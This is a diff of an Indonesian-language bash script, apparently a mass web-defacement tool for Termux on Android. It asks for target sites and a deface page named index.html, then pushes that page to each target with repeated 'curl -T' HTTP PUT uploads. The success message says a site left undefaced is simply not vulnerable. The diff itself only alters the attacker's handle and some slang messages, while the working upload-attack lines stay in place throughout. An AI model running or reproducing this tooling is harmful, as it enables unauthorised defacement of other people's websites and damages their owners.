@@ -172,10 +172,10 @@ echo $green "╭─"$blue"Chemod@MR.L4M3R"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ "  target
 echo
 echo $red "Masukan Script!!! "
-echo $green "╭─"$blue"Chemod@MR.L4M3R"$cyan" ~/Nama SC Harus(index.html) ganti dulu sono"$white
+echo $green "╭─"$blue"Chemod@MR.L4M3R"$cyan" ~/Nama SC Harus(index.html) "$white
 read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
-echo $red "["$yellow"Sukses Bos Silahkan Di Cek (Kalo Masih gak Ketebas Berarti Web Nya Gak Vuln)"$red"]"$Xploit"～～～＞"$green" $target"
+echo $red "["$yellow"Suksess tod"$red"]"$Xploit"～～～＞"$green" $target"
 echo
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
 read -p "[B/Q] : " back
@@ -220,7 +220,7 @@ read -p " ╰─$ " script
 echo
 echo
 echo $white"Masukan Target1 !!!!"
-echo $white "╭─"$green"Chemod@MR.L4M3R"$cyan" ~/Crooott"$white
+echo $white "╭─"$green"Chemod@MR.L4M3R"$cyan" ~/Crot"$white
 read -p " ╰─$ " target1
 curl -T /storage/emulated/0/$script $target1
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
@@ -238,7 +238,7 @@ curl -T /storage/emulated/0/$script $target3
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
 echo
 echo $white"Masukan Target4 !!!!"
-echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
+echo $white "╭─"$green"Chemod@MR.L4M3R"$cyan" ~/IndoCyber"$white
 read -p " ╰─$ " target4
 curl -T /storage/emulated/0/$script $target4
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
@@ -322,7 +322,7 @@ curl -T /storage/emulated/0/$script $target17
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
 echo
 echo $white"Masukan Target18 !!!! "
-echo $white "╭─"$green"Chemod@MF.L4M3R"$cyan" ~/Crot"$white
+echo $white "╭─"$green"Chemod@MR.L4M3R"$cyan" ~/Crot"$white
 read -p " ╰─$ " target18
 curl -T /storage/emulated/0/$script $target18
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
